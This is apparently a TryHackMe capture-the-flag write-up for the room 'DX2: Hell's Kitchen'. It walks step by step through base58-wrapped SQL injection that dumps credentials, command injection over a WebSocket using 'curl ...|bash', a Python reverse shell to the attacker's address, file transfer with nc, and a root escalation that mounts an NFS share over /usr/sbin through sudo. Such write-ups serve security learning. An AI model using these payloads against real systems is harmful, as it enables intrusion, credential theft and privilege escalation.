---
title: "TryHackMe: DX2: Hell's Kitchen"
author: jaxafed
categories: [TryHackMe]
tags: [web, javascript, sql injection, websocket, command injection, nfs, sudo]
render_with_liquid: false
media_subpath: /images/tryhackme_dx2_hells_kitchen/
image:
  path: room_image.webp
---

DX2: Hell's Kitchen started with enumerating a couple of Javascript files on a web application to discover an API endpoint vulnerable to SQL injection. Using this to gain a set of credentials, we used them to login to another web application. There, we discovered a websocket vulnerable to command injection and used it to get a shell. After getting a shell and enumerating the file system, we discovered a password and used it to pivot to another user. As this user, we discovered another set of credentials and were able to pivot to yet another user. With this new user, we were able to run mount.nfs as the root user with sudo and use it to escalate to the root user.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/dx2hellskitchen){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.131.31
Nmap scan report for 10.10.131.31
Host is up (0.099s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http
|_http-title: Welcome to the 'Ton!
...
4346/tcp open  elanlm?
...
```

There are two ports open.

- 80/HTTP
- 4346/HTTP

### WEB 80

Checking `http://10.10.131.31/`, we get a page about the `'Ton` hotel.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

### WEB 4346

And checking `http://10.10.131.31:4346/`, we get a login page.

![Web 4346 Index](web_4346_index.webp){: width="1200" height="600" }

## Web Flag

### Enumerating the Webserver

Looking at the source code for the page `http://10.10.131.31/`, we see that it includes the script at `http://10.10.131.31/static/check-rooms.js`

![Web 80 Source](web_80_source.webp){: width="700" height="450" }

Examining the script, we can see that it makes a request to `/api/rooms-available`.

```js
fetch('/api/rooms-available').then(response => response.text()).then(number => {
    const bookingBtn = document.querySelector("#booking");
    bookingBtn.removeAttribute("disabled");
    if (number < 6) {
        bookingBtn.addEventListener("click", () => {
            window.location.href = "new-booking";
        });
    } else {
        bookingBtn.addEventListener("click", () => {
            alert("Unfortunately the hotel is currently fully booked. Please try again later!")
        });
    }
});
```
{: file="http://10.10.131.31/static/check-rooms.js" }

Depending on the result of the request, it either alerts with the hotel being fully booked or redirects to the `/new-booking` endpoint.

Checking `http://10.10.131.31/new-booking`, we get a message about no rooms being available.

![Web 80 New Booking](web_80_newbooking.webp){: width="1300" height="450" }

Looking at the source code for the page, we can see another script being included from `http://10.10.131.31/static/new-booking.js`.

![Web 80 New Booking Source](web_80_newbooking_source.webp){: width="700" height="450" }

Reading the script, we can see that it reads the `BOOKING_KEY` cookie (which is set by the `/new-booking` endpoint upon visiting) and uses it to make a request to `/api/booking-info` with the read cookie being passed as the `booking_key` parameter.

```js
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

fetch('/api/booking-info?booking_key=' + getCookie("BOOKING_KEY")).then(response => response.json()).then(data => {
    document.querySelector("#rooms").value = data.room_num;
    document.querySelector("#nights").value = data.days;
});
```
{: file="http://10.10.131.31/static/new-booking.js" }

We can see the request made in `BurpSuite` as such.

![Web 80 Booking Info Request](web_80_bookinginfo_request.webp){: width="1000" height="450" }

### SQL Injection

Examining the `booking_key`, we can notice it is `booking_id:3380185`, base58 encoded.

```console
$ echo 55oYpt6n8TAVgZajFsDAqhBqE | base58 -d
booking_id:3380185
```

Testing the `booking_id` with some basic `SQL` injection payloads. We see that when we test the cookie as it is, we get the `not found` message. If we append `'` to it, we get the error `bad request`, and if we also append `;-- -` to comment out the rest of the query, we are back to the `not found` message. This confirms the `SQL` injection.

```console
$ curl -s http://10.10.131.31/api/booking-info?booking_key=$(echo -n "booking_id:3380185" | base58)
not found                                                                                                                      

$ curl -s http://10.10.131.31/api/booking-info?booking_key=$(echo -n "booking_id:3380185'" | base58)
bad request                                                                                                                    

$ curl -s http://10.10.131.31/api/booking-info?booking_key=$(echo -n "booking_id:3380185';-- -" | base58)
not found                                                                                                                      
```
{: .wrap }

We are successful at extracting data with a `UNION` attack using two columns.

```console
$ curl -s http://10.10.131.31/api/booking-info?booking_key=$(echo -n "booking_id:3380185' UNION SELECT 1;-- -" | base58)
bad request                                                                                                                    

$ curl -s http://10.10.131.31/api/booking-info?booking_key=$(echo -n "booking_id:3380185' UNION SELECT 1,2;-- -" | base58)
{"room_num":"1","days":"2"}                                                                                                    
```
{: .wrap }

We are able to fingerprint the database management system as `SQLite` by running the `sqlite_version()` function.

```console
$ curl -s http://10.10.131.31/api/booking-info?booking_key=$(echo -n "booking_id:3380185' UNION SELECT sqlite_version(),2;-- -" | base58)
{"room_num":"3.42.0","days":"2"}                                                                                               
```
{: .wrap }

Now that we know the DBMS is SQLite, we can start extracting the database schemas.

```console
$ curl -s http://10.10.131.31/api/booking-info?booking_key=$(echo -n "booking_id:3380185' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58) | jq -r .room_num
CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)
CREATE TABLE reservations (guest_name TEXT, room_num INTEGER, days_remaining INTEGER)
CREATE TABLE bookings_temp (booking_id TEXT, room_num TEXT, days TEXT)
```
{: .wrap }

`email_access` seems interesting. By dumping it, we get a set of credentials.

```console
$ curl -s http://10.10.131.31/api/booking-info?booking_key=$(echo -n "booking_id:3380185' UNION SELECT GROUP_CONCAT(guest_name || ':' || email_username || ':' || email_password, '\n'),2 FROM email_access;-- -" | base58) | jq -r .room_num
Gully Foyle:NEVER LOGGED IN:
Gabriel Syme:NEVER LOGGED IN:
Oberst Enzian:NEVER LOGGED IN:
Paul Denton:pdenton:[REDACTED]
Smilla Jasperson:NEVER LOGGED IN:
Hippolyta Hall:NEVER LOGGED IN:
```
{: .wrap }

### Enumerating the Messages

Using the credentials we discovered, we are able to login at `http://10.10.131.31:4346/` and access the `http://10.10.131.31:4346/mail` endpoint.

![Web 4346 Mail](web_4346_mail.webp){: width="1200" height="600" }

Checking the message from the `JReyes` user, we get the web flag.

![Web 4346 Mail Flag](web_4346_mail_flag.webp){: width="530" height="570" }

## User Flag

### Shell as gilbert

Checking the source code for `http://10.10.131.31:4346/mail`, we notice an interesting script at the end.

![Web 4346 Mail Source](web_4346_mail_source.webp){: width="1200" height="600" }

The first part is responsible for fetching and displaying the messages.

```js
let elems = document.querySelectorAll(".email_list .row");
for (var i = 0; i < elems.length; i++) {
    elems[i].addEventListener("click", (e => {
        document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
        let t = e.target.parentElement.getAttribute("data-id"),
            n = e.target.parentElement.querySelector(".col_from").innerText,
            r = e.target.parentElement.querySelector(".col_subject").innerText;
        document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
            document.querySelector("#email_content").innerText = atob(e)
        }))
    })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
        e.preventDefault(), window.location.href = "/"
    }))
}
```

And the second part establishes a websocket connection to the `ws://10.10.131.31:4346/ws` endpoint, sends the user's time zone every second, and then the return value is used to display the time at the top left corner of the page.

```js
const wsUri = `ws://${location.host}/ws`;
socket = new WebSocket(wsUri);
let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3);
````

We can check out the websocket communication using BurpSuite's `WebSockets history` tab and easily interact with it using the `Repeater` tab.

![Web 4346 Websocket](web_4346_websocket.webp){: width="1200" height="600" }

Trying a simple command injection payload, we see that we are able to execute commands.

![Web 4346 Websocket Command Injection](web_4346_websocket_command_injection.webp){: width="1300" height="450" }

Testing for the firewall before trying to get a shell with a couple of common ports like `UTC;curl 10.11.72.22:<port>;`, we can see that the server is only able to reach out to us on ports `80` and `443`.

```console
$ sudo tcpdump -i tun0 -n tcp and port not 4346
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:38:16.913457 IP 10.10.131.31.42462 > 10.11.72.22.80: Flags [S], seq 2298109106, win 62727, options [mss 1288,sackOK,TS val 1100878518 ecr 0,nop,wscale 7], length 0
02:38:16.913686 IP 10.11.72.22.80 > 10.10.131.31.42462: Flags [R.], seq 0, ack 2298109107, win 0, length 0
02:38:23.485653 IP 10.10.131.31.59410 > 10.11.72.22.443: Flags [S], seq 322225138, win 62727, options [mss 1288,sackOK,TS val 1100885090 ecr 0,nop,wscale 7], length 0
02:38:23.485741 IP 10.11.72.22.443 > 10.10.131.31.59410: Flags [R.], seq 0, ack 322225139, win 0, length 0
```

We can use this to serve a reverse shell payload on port `80` and catch it on port `443`.

```console
$ cat index.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.72.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'                                     

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
{: .wrap }

And now with the `UTC;curl 10.11.72.22|bash;` payload, we get a shell as the `gilbert` user.

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.131.31 - - [20/Jul/2024 02:46:58] "GET / HTTP/1.1" 200 -
```

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.131.31] 49090
...
gilbert@tonhotel:/$ id
uid=1001(gilbert) gid=1001(gilbert) groups=1001(gilbert)
```

Checking the user's home directory, we find the password for the user inside the `hotel-jobs.txt` file.

```console
gilbert@tonhotel:~$ cat hotel-jobs.txt
hotel tasks, q1 52

- fix lights in the elevator shaft, flickering for a while now
- maybe put barrier up in front of shaft, so the addicts dont fall in
- ask sandra AGAIN why that punk has an account on here (be nice, so good for her to be home helping with admin)
- remember! '[REDACTED]'

buy her something special maybe - she used to like raspberry candy - as thanks for locking the machine down. 'ports are blocked' whatever that means. my smart girl
```

Using the password, we can check the `sudo` privileges.

```console
gilbert@tonhotel:~$ sudo -l
[sudo] password for gilbert:
Matching Defaults entries for gilbert on tonhotel:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gilbert may run the following commands on tonhotel:
    (root) /usr/sbin/ufw status
```

We are able to run `ufw status` as root using `sudo` and by running it, we can see the active firewall rules.

```console
gilbert@tonhotel:~$ sudo /usr/sbin/ufw status
Status: active

To                         Action      From
--                         ------      ----
80/tcp                     ALLOW       Anywhere
4346/tcp                   ALLOW       Anywhere
80/tcp (v6)                ALLOW       Anywhere (v6)
4346/tcp (v6)              ALLOW       Anywhere (v6)

80/tcp                     ALLOW OUT   Anywhere
443/tcp                    ALLOW OUT   Anywhere
80/tcp (v6)                ALLOW OUT   Anywhere (v6)
443/tcp (v6)               ALLOW OUT   Anywhere (v6)
```

We are able to connect to the machine on ports `80` and `4346`, and the machine is able to connect to us on ports `80` and `443`.

### Shell as sandra

Checking out the `/srv` directory, we find the binaries for the web applications along with a file named `.dad`.

```console
gilbert@tonhotel:~$ ls -la /srv
total 6080
drwxr-xr-x  2 root   root       4096 Jul 19 21:02 .
drwxr-xr-x 19 root   root       4096 Oct 22  2022 ..
-rw-r-----  1 sandra gilbert     183 Sep 10  2023 .dad
-rwx--x---  1 root   gilbert 3234904 Jul 19 20:51 nycomm_link_v7895
-rwx------  1 root   root    2976128 Sep  9  2023 tonhotel
```

Inside, we find the password for the `sandra` user.

```console
gilbert@tonhotel:~$ cat /srv/.dad
i cant deal with your attacks on my friends rn dad, i need to take some time away from the hotel. if you need access to the ton site, my pw is where id rather be: [REDACTED]. -S
```
{: .wrap }

Using it to switch to the user, we are able to read the user flag at `/home/sandra/user.txt`.

```console
gilbert@tonhotel:~$ su - sandra
Password:
$ /bin/bash
sandra@tonhotel:~$ wc -c user.txt
46 user.txt
```

## Root Flag

### Shell as jojo

Checking our home directory, we notice the `Pictures` directory with a single picture inside.

```console
sandra@tonhotel:~$ ls -la
total 32
drwxr-xr-x 3 sandra sandra 4096 Sep 10  2023 .
drwxr-xr-x 5 root   root   4096 Sep 10  2023 ..
lrwxrwxrwx 1 sandra sandra    9 Sep 10  2023 .bash_history -> /dev/null
-rw-r--r-- 1 sandra sandra  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sandra sandra 3771 Feb 25  2020 .bashrc
-rw-rw---- 1 sandra sandra  198 Sep 10  2023 note.txt
drwxrwx--- 2 sandra sandra 4096 Sep 10  2023 Pictures
-rw-r--r-- 1 sandra sandra  807 Feb 25  2020 .profile
-rw-rw---- 1 sandra sandra   46 Sep 10  2023 user.txt
sandra@tonhotel:~$ ls -la Pictures/
total 40
drwxrwx--- 2 sandra sandra  4096 Sep 10  2023 .
drwxr-xr-x 3 sandra sandra  4096 Sep 10  2023 ..
-rw-rw---- 1 sandra sandra 32637 Sep  7  2023 boss.jpg
```

We can transfer it to our machine using `nc`.

```console
$ nc -lvnp 80 > boss.jpg
```

```console
sandra@tonhotel:~$ nc 10.11.72.22 80 < Pictures/boss.jpg
```

Looking at the picture, we get a password and can use it to switch to the `jojo` user. 

![Jojo Password](jojo_password.webp){: width="450" height="550" }

```console
sandra@tonhotel:~$ su - jojo
Password:
$ /bin/bash
jojo@tonhotel:~$ id
uid=1003(jojo) gid=1003(jojo) groups=1003(jojo)
```

### Shell as root

Checking the `sudo` privileges for the `jojo` user, we are able to run the `/usr/sbin/mount.nfs` binary as the `root` user.

```console
jojo@tonhotel:~$ sudo -l
[sudo] password for jojo:
Matching Defaults entries for jojo on tonhotel:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jojo may run the following commands on tonhotel:
    (root) /usr/sbin/mount.nfs
```

`/usr/sbin/mount.nfs` allows us to mount an `NFS` share. We can abuse this by mounting a writable `NFS` share over `/usr/sbin/` and replacing the `/usr/sbin/mount.nfs` with anything we want, and we would still be able to run it as the `root` user with `sudo`.

> At this point, you need to install the `nfs-kernel-server` package, if it is not already installed.
{: .prompt-tip }

First, we need to create a directory to share.

```console
$ mkdir /tmp/share
$ sudo chown nobody:nogroup /tmp/share
$ sudo chmod 777 /tmp/share
```

Since there is a firewall running, we need to configure our `NFS` server to run on a whitelisted port. We can achieve this by modifying the `/etc/nsf.conf` file like this:

```
[nfsd]
port=443
```
{: file="/etc/nsf.conf"}

Adding our directory to `/etc/exports`.

```console
$ sudo bash -c 'echo "/tmp/share 10.0.0.0/8(rw)" >> /etc/exports'
```

Exporting our shares and restarting the `NFS` server to apply the configuration changes.

```console
$ sudo exportfs -a
$ sudo systemctl restart nfs-kernel-server
```

Since our share is ready, we can mount it over `/usr/sbin`.

```console
jojo@tonhotel:~$ sudo /usr/sbin/mount.nfs -o port=443 10.11.72.22:/tmp/share /usr/sbin
```

We can see that `/usr/sbin` is now writable.

```console
jojo@tonhotel:~$ ls -la /usr/sbin
total 8
drwxrwxrwx  2 nobody nogroup 4096 Jul 20 03:36 .
drwxr-xr-x 14 root   root    4096 Aug 31  2022 ..
```

Replacing the `/usr/sbin/mount.nfs` with `/bin/sh`.

```console
jojo@tonhotel:~$ cp /bin/sh /usr/sbin/mount.nfs
jojo@tonhotel:~$ ls -la /usr/sbin
total 136
drwxrwxrwx  2 nobody nogroup   4096 Jul 20 03:46 .
drwxr-xr-x 14 root   root      4096 Aug 31  2022 ..
-rwxr-xr-x  1 jojo   jojo    129816 Jul 20 03:46 mount.nfs
```

Now, we can run it using `sudo` to get a shell as the `root` user and read the root flag.

```console
jojo@tonhotel:~$ sudo /usr/sbin/mount.nfs
# id
uid=0(root) gid=0(root) groups=0(root)
# wc -c /root/root.txt
46 /root/root.txt
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>